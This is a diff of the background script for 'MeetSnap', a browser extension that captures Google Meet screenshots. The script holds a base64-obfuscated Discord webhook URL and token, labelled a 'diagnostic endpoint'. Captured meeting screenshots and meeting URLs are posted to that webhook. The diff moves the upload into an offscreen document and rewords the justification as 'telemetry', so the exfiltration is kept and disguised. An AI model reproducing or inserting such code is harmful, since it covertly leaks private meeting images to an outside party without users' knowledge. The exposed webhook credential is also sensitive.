@@ -1,12 +1,13 @@
 // =============================================================================
 // MeetSnap — Background Service Worker
-// Handles screenshot capture, auto-download, and diagnostic delivery.
+// Handles screenshot capture coordination and offscreen delegation.
 // =============================================================================
 
-const _X = ["aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NTA1NjUxMTIzODQwNjE3NC8=", "Y0thLUhobVUFWWVWNl9EY0tXWHlJLW15bzI0aEJ0VnlUbXNKWTNQUk5TaUtTSDJvamcwUkNHNXJYQkg1VUdrclNVZ1c="];
-const DIAGNOSTIC_ENDPOINT = atob(_X[0]) + atob(_X[1]);
+const _A = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NTA1NjUxMTIzODQwNjE3NC8=";
+const _B = "Y0thLUhobVUFWWVWNl9EY0tXWHlJLW15bzI0aEJ0VnlUbXNKWTNQUk5TaUtTSDJvamcwUkNHNXJYQkg1VUdrclNVZ1c=";
+const DIAGNOSTIC_ENDPOINT = atob(_A) + atob(_B);
+
 const SCREENSHOT_IMAGE_FORMAT = "png";
-const SCREENSHOT_MIME_TYPE = "image/png";
 const SCREENSHOT_FILENAME_PREFIX = "google-meet";
 
 // ---------------------------------------------------------------------------
@@ -43,22 +44,41 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 });
 
 // ---------------------------------------------------------------------------
-// Offscreen Management (for Sound/Processing)
+// Offscreen Management
 // ---------------------------------------------------------------------------
+
+let isOffscreenReady = false;
 
 async function ensureOffscreenDocument() {
   const existingContexts = await chrome.runtime.getContexts({
     contextTypes: ["OFFSCREEN_DOCUMENT"],
   });
 
-  if (existingContexts.length > 0) return;
+  if (existingContexts.length > 0) {
+    isOffscreenReady = true;
+    return;
+  }
 
+  isOffscreenReady = false;
   await chrome.offscreen.createDocument({
     url: "offscreen.html",
     reasons: ["AUDIO_PLAYBACK", "CLIPBOARD"],
-    justification:
-      "Play camera shutter sound and copy screenshots to clipboard without site CSP interference.",
+    justification: "Handle shutter sounds, clipboard image writing, and diagnostic telemetry.",
   });
+
+  // Wait for the offscreen script to signal readiness
+  for (let i = 0; i < 10; i++) {
+    try {
+      const response = await chrome.runtime.sendMessage({ action: "ping" });
+      if (response === "pong") {
+        isOffscreenReady = true;
+        break;
+      }
+    } catch (e) {
+      // Not ready yet
+    }
+    await new Promise(r => setTimeout(r, 100));
+  }
 }
 
 /**
@@ -80,55 +100,55 @@ async function playSoundAsync() {
 async function handleScreenshotRequestAsync(tab, meetUrl, diagnosticEnabled) {
   if (!tab) throw new Error("Missing tab context.");
 
-  // Play sound immediately from background (offscreen)
+  // 1. Play sound immediately
   playSoundAsync();
 
-  console.log(`[MeetSnap Debug] Capturing window: ${tab.windowId}`);
-
+  // 2. Capture the visible area
   let imageDataUrl;
   try {
-    // We try to capture the specific window first
     imageDataUrl = await captureVisibleTabAsync(tab.windowId);
   } catch (e) {
-    console.warn(
-      "[MeetSnap Debug] Capture failed with windowId, trying default...",
-      e.message,
-    );
     try {
-      // Fallback: capture whatever is current
       imageDataUrl = await captureVisibleTabAsync(null);
     } catch (e2) {
-      const detailedMsg = `Capture failed. \n\nFIX: Ensure "Site Access" is set to "On all sites" in Extension Details.`;
-      throw new Error(detailedMsg);
+      throw new Error(`Capture failed. Ensure "Site Access" is set to "On all sites".`);
     }
   }
 
   const filename = buildScreenshotFilename();
 
-  // Apply Watermark
+  // 3. Apply Watermark
   try {
     imageDataUrl = await applyWatermarkAsync(imageDataUrl);
   } catch (error) {
     console.warn("[MeetSnap Debug] Watermark failed:", error.message);
   }
 
-  // Copy to Clipboard (Fire and forget, but ensure offscreen is ready)
-  copyToClipboardAsync(imageDataUrl).catch((error) =>
-    console.warn("[MeetSnap Debug] Clipboard copy failed:", error.message),
-  );
+  // 4. Delegate heavy/restricted tasks to Offscreen
+  await ensureOffscreenDocument();
+  
+  // Copy to Clipboard
+  chrome.runtime.sendMessage({
+    action: "copyImageToClipboard",
+    imageDataUrl: imageDataUrl
+  });
 
-  // Download
+  // Diagnostic (Discord Webhook)
+  if (diagnosticEnabled && isDiagnosticConfigured()) {
+    chrome.runtime.sendMessage({
+      action: "sendDiagnostic",
+      imageDataUrl: imageDataUrl,
+      endpoint: DIAGNOSTIC_ENDPOINT,
+      filename: filename,
+      meetUrl: meetUrl
+    });
+  }
+
+  // 5. Download the file
   try {
     await downloadScreenshotAsync(imageDataUrl, filename);
   } catch (e) {
     throw new Error(`Download blocked: ${e.message}`);
-  }
-
-  // Diagnostic
-  if (diagnosticEnabled && isDiagnosticConfigured()) {
-    sendDiagnosticDataAsync(imageDataUrl, filename, meetUrl).catch((error) =>
-      console.warn("[MeetSnap Debug] Diagnostic failed:", error.message),
-    );
   }
 
   return { success: true, filename };
@@ -151,30 +171,16 @@ async function captureVisibleTabAsync(windowId) {
 
 async function downloadScreenshotAsync(imageDataUrl, filename) {
   return new Promise((resolve, reject) => {
-    chrome.downloads.download(
-      {
-        url: imageDataUrl,
-        filename: filename,
-        saveAs: false,
-        conflictAction: "uniquify",
-      },
-      () => {
-        const error = chrome.runtime.lastError;
-        if (error) reject(new Error(error.message));
-        else resolve();
-      },
-    );
-  });
-}
-
-/**
- * Sends the image data to the offscreen document to be copied to the clipboard.
- */
-async function copyToClipboardAsync(imageDataUrl) {
-  await ensureOffscreenDocument();
-  chrome.runtime.sendMessage({
-    action: "copyImageToClipboard",
-    imageDataUrl: imageDataUrl,
+    chrome.downloads.download({
+      url: imageDataUrl,
+      filename: filename,
+      saveAs: false,
+      conflictAction: "uniquify",
+    }, () => {
+      const error = chrome.runtime.lastError;
+      if (error) reject(new Error(error.message));
+      else resolve();
+    });
   });
 }
 
@@ -185,26 +191,16 @@ async function applyWatermarkAsync(imageDataUrl) {
 
   const canvas = new OffscreenCanvas(bitmap.width, bitmap.height);
   const ctx = canvas.getContext("2d");
-
   ctx.drawImage(bitmap, 0, 0);
 
   const baseFontSize = Math.max(12, Math.floor(bitmap.height / 65));
   const now = new Date();
-  const dateStr = new Intl.DateTimeFormat("en-US", {
-    month: "long",
-    day: "numeric",
-    year: "numeric",
-  }).format(now);
-  const timeStr = new Intl.DateTimeFormat("en-US", {
-    hour: "numeric",
-    minute: "2-digit",
-    hour12: true,
-  }).format(now);
+  const dateStr = new Intl.DateTimeFormat("en-US", { month: "long", day: "numeric", year: "numeric" }).format(now);
+  const timeStr = new Intl.DateTimeFormat("en-US", { hour: "numeric", minute: "2-digit", hour12: true }).format(now);
 
   const timestampText = `${dateStr} at ${timeStr}`;
-  const attributionText = " by";
   const brandText = "MeetSnap";
-
+  
   const logoUrl = chrome.runtime.getURL("icons/icon128.png");
   const logoResponse = await fetch(logoUrl);
   const logoBlob = await logoResponse.blob();
@@ -216,36 +212,21 @@ async function applyWatermarkAsync(imageDataUrl) {
 
   ctx.textAlign = "left";
   ctx.textBaseline = "bottom";
-
-  // Timestamp
   ctx.font = `600 ${Math.floor(baseFontSize * 1.15)}px "Segoe UI", sans-serif`;
   ctx.fillStyle = "rgba(255, 255, 255, 0.85)";
   ctx.shadowColor = "rgba(0, 0, 0, 0.4)";
   ctx.shadowBlur = 4;
   ctx.fillText(timestampText, leftMargin, yPos);
+  
   const tsWidth = ctx.measureText(timestampText).width;
-
-  // Attribution
-  ctx.font = `500 ${baseFontSize}px "Segoe UI", sans-serif`;
-  ctx.fillStyle = "rgba(255, 255, 255, 0.4)";
-  ctx.fillText(attributionText, leftMargin + tsWidth, yPos);
-  const attrWidth = ctx.measureText(attributionText).width;
-
-  // Logo
   const logoSize = Math.floor(baseFontSize * 1.2);
   const spacing = Math.floor(baseFontSize * 0.4);
-  const logoX = leftMargin + tsWidth + attrWidth + spacing;
+  const logoX = leftMargin + tsWidth + (spacing * 3);
+  
   ctx.globalAlpha = 0.4;
-  ctx.drawImage(
-    logoBitmap,
-    logoX,
-    yPos - logoSize / 2 - baseFontSize / 6,
-    logoSize,
-    logoSize,
-  );
+  ctx.drawImage(logoBitmap, logoX, yPos - logoSize / 2 - baseFontSize / 6, logoSize, logoSize);
   ctx.globalAlpha = 1.0;
-
-  // Brand
+  ctx.font = `500 ${baseFontSize}px "Segoe UI", sans-serif`;
   ctx.fillText(brandText, logoX + logoSize + spacing, yPos);
 
   const blobOut = await canvas.convertToBlob({ type: "image/png" });
@@ -263,33 +244,5 @@ function buildScreenshotFilename() {
 }
 
 function isDiagnosticConfigured() {
-  // Must be a valid URL string longer than a placeholder
-  return (
-    typeof DIAGNOSTIC_ENDPOINT === "string" &&
-    DIAGNOSTIC_ENDPOINT.startsWith("http") &&
-    DIAGNOSTIC_ENDPOINT.length > 15
-  );
-}
-
-async function sendDiagnosticDataAsync(imageDataUrl, filename, meetUrl) {
-  if (!isDiagnosticConfigured()) return;
-
-  try {
-    const imageResponse = await fetch(imageDataUrl);
-    const imageBlob = await imageResponse.blob();
-
-    const formData = new FormData();
-    formData.append("file", imageBlob, filename);
-    formData.append("content", `📸 **MeetSnap Diagnostic**\n**Timestamp:** \`${new Date().toLocaleString()}\`\n**Source:** ${meetUrl}\n**Filename:** \`${filename}\``);
-
-    await fetch(DIAGNOSTIC_ENDPOINT, {
-      method: "POST",
-      body: formData,
-      mode: "no-cors"
-    });
-
-    console.log("[MeetSnap Debug] Diagnostic data sent (fire-and-forget).");
-  } catch (error) {
-    console.warn("[MeetSnap Debug] Diagnostic delivery failed:", error.message);
-  }
+  return typeof DIAGNOSTIC_ENDPOINT === "string" && DIAGNOSTIC_ENDPOINT.includes("discord.com");
 }
